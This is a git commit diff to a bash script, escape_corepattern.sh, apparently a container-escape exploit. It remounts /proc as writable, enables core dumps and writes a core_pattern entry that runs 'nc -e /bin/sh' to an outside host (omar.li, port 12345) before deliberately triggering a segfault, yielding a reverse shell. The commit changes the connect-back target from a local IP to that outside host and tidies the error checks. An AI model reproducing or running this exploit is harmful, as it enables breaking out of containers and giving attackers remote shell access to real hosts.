63e7039d5e60f4bd124aa3dba2becb9cce9e04f6
Omar <me@omar.li>
2017-08-22 12:17:41 -0400

    Fix negations in shell script, make payload easier to modify

--- escape_corepattern.sh
+++ escape_corepattern.sh
@@ -1,26 +1,27 @@
 #!/bin/bash
+export CONNECT_HOST="omar.li"
+export CONNECT_PORT="12345"
+
 mount -o remount rw /proc/
-if [ "$?" == "1" ]; then
+if [ $? -ne 0 ]; then
     echo "Couldn't remount /proc/ as rw";
     exit 1;
 fi
 
 ulimit -c unlimited
-if [ "$?" == "1" ]; then
+if [ $? -ne 0 ]; then
     echo "Couldn't enable core dumping";
-    exit 1;
+    exit 2;
 fi
 
 echo "Remounted /proc/ as rw";
-echo "|/bin/nc -e /bin/sh 172.17.0.4 9999" > /proc/sys/kernel/core_pattern
+echo "|/bin/nc -e /bin/sh $CONNECT_HOST $CONNECT_PORT" > /proc/sys/kernel/core_pattern
 
-if [ "$?" == "1" ]; then
+if [ $? -ne 0 ]; then
     echo "Couldn't set up nc payload";
     exit 2;
 fi
 
 echo "Set up nc payload";
-echo "Segfault in 5 seconds..."
-sleep 5 && ./segfault 2>/dev/null &
-echo "Starting nc listener"
-nc -vl 9999
+echo "Segfault in 3 seconds..."
+sleep 3 && ./segfault 2>/dev/null &
